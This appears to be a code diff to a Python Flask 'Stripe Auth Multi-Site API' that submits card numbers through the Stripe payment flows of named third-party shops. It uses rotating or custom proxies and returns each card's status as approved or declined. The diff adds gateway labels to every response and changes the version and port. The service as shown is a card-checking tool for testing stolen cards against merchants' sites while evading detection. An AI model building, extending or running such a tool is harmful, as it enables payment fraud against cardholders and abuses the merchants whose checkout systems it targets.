@@ -10,7 +10,8 @@ Supported Target Sites:
 4. Odin Water Polo (odinwaterpolo.com)
 5. Noble Rot (noble-rot.newsstand.co.uk)
 
-Proxy Features:
+Features:
+- Includes 'gateway' and 'gateway_name' in all JSON/Text responses
 - Per-request custom proxy: `&proxy=ip:port:user:pass` or `&proxy=http://...` or `&proxy=socks5://...`
 - Dynamic proxy pool with auto-rotation
 - Proxy management endpoints: `/proxy/add`, `/proxy/list`, `/proxy/clear`, `/proxy/stats`
@@ -235,6 +236,8 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
         proxy_url = proxy_manager.parse_proxy(proxy_input) if proxy_input else proxy_manager.get_next()
         site = get_site_config(site_param)
         domain = site["domain"]
+        gw_name = site.get("name", domain)
+        full_gw = f"Stripe Auth ({gw_name})"
 
         user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
         headers_init = {
@@ -249,6 +252,8 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
                 return {
                     "status": "error",
                     "message": f"Failed to retrieve Stripe key for {domain}",
+                    "gateway": full_gw,
+                    "gateway_name": gw_name,
                     "site": domain,
                     "proxy": proxy_url.split('@')[-1] if proxy_url else "direct",
                     "card": cc_input
@@ -346,6 +351,8 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
                     "status": "declined",
                     "code": decline_code,
                     "message": message,
+                    "gateway": full_gw,
+                    "gateway_name": gw_name,
                     "site": domain,
                     "proxy": used_proxy_tag,
                     "card": cc_input,
@@ -358,6 +365,8 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
                 return {
                     "status": "error",
                     "message": f"PaymentMethod ID missing from Stripe response: {json_stripe}",
+                    "gateway": full_gw,
+                    "gateway_name": gw_name,
                     "site": domain,
                     "proxy": used_proxy_tag,
                     "card": cc_input,
@@ -372,6 +381,8 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
                     "code": "pm_created",
                     "message": f"Payment Method Created ({pm_id}) 💎",
                     "payment_method_id": pm_id,
+                    "gateway": full_gw,
+                    "gateway_name": gw_name,
                     "site": domain,
                     "proxy": used_proxy_tag,
                     "card": cc_input,
@@ -430,6 +441,8 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
                                 "status": "approved",
                                 "code": "succeeded",
                                 "message": "Payment Method Added / SetupIntent Succeeded 💎",
+                                "gateway": full_gw,
+                                "gateway_name": gw_name,
                                 "site": domain,
                                 "proxy": used_proxy_tag,
                                 "card": cc_input,
@@ -450,6 +463,8 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
                                 "status": "declined",
                                 "code": "card_declined",
                                 "message": clean_msg,
+                                "gateway": full_gw,
+                                "gateway_name": gw_name,
                                 "site": domain,
                                 "proxy": used_proxy_tag,
                                 "card": cc_input,
@@ -461,6 +476,8 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
                                 "status": "approved",
                                 "code": "succeeded",
                                 "message": "Payment Method Added / SetupIntent Succeeded 💎",
+                                "gateway": full_gw,
+                                "gateway_name": gw_name,
                                 "site": domain,
                                 "proxy": used_proxy_tag,
                                 "card": cc_input,
@@ -471,6 +488,8 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
                                 "status": "declined",
                                 "code": "card_declined",
                                 "message": "Your card was declined.",
+                                "gateway": full_gw,
+                                "gateway_name": gw_name,
                                 "site": domain,
                                 "proxy": used_proxy_tag,
                                 "card": cc_input,
@@ -484,6 +503,8 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
                 "status": "declined",
                 "code": "card_declined",
                 "message": "Your card was declined.",
+                "gateway": full_gw,
+                "gateway_name": gw_name,
                 "site": domain,
                 "proxy": used_proxy_tag,
                 "card": cc_input,
@@ -495,6 +516,8 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
         return {
             "status": "error",
             "message": str(e),
+            "gateway": full_gw if 'full_gw' in locals() else "Stripe Auth",
+            "gateway_name": gw_name if 'gw_name' in locals() else "Unknown",
             "site": site.get("domain", "unknown") if 'site' in locals() else "unknown",
             "proxy": proxy_url.split('@')[-1] if 'proxy_url' in locals() and proxy_url else "direct",
             "card": cc_input,
@@ -509,7 +532,7 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
 def index():
     return jsonify({
         "name": "Stripe Auth Multi-Site API",
-        "version": "2.1.0",
+        "version": "2.2.0",
         "status": "online",
         "sites_count": len(SITES_CONFIG),
         "proxy_pool": proxy_manager.get_stats(),
@@ -522,7 +545,7 @@ def index():
             "/proxy/clear": "GET clear loaded proxy pool",
             "/health": "GET health check"
         },
-        "sites": [{"id": s["id"], "domain": s["domain"], "active": s["active"]} for s in SITES_CONFIG]
+        "sites": [{"id": s["id"], "domain": s["domain"], "name": s["name"], "active": s["active"]} for s in SITES_CONFIG]
     })
 
 @app.route('/health', methods=['GET'])
@@ -612,7 +635,7 @@ def stripe_endpoint():
     result, status_code = asyncio.run(process_stripe_auth(cc, site_param, proxy_param))
 
     if fmt == 'text':
-        text_out = f"STATUS: {result.get('status', 'unknown').upper()} | MSG: {result.get('message', '')} | SITE: {result.get('site', '')} | PROXY: {result.get('proxy', '')} | CARD: {result.get('card', '')}"
+        text_out = f"STATUS: {result.get('status', 'unknown').upper()} | MSG: {result.get('message', '')} | GATEWAY: {result.get('gateway', '')} | SITE: {result.get('site', '')} | PROXY: {result.get('proxy', '')} | CARD: {result.get('card', '')}"
         return Response(text_out, mimetype='text/plain'), status_code
 
     return jsonify(result), status_code
@@ -628,7 +651,7 @@ def catch_all_routes(catch_all):
     return jsonify({"error": "Route not found", "available_routes": ["/check", "/stripe", "/sites", "/proxy/add", "/proxy/list", "/health"]}), 404
 
 if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 10000))
+    port = int(os.environ.get('PORT', 6969))
     print("=" * 60)
     print(f"[*] STRIPE AUTH MULTI-SITE API SERVER")
     print(f"[*] Configured Sites: {len(SITES_CONFIG)}")
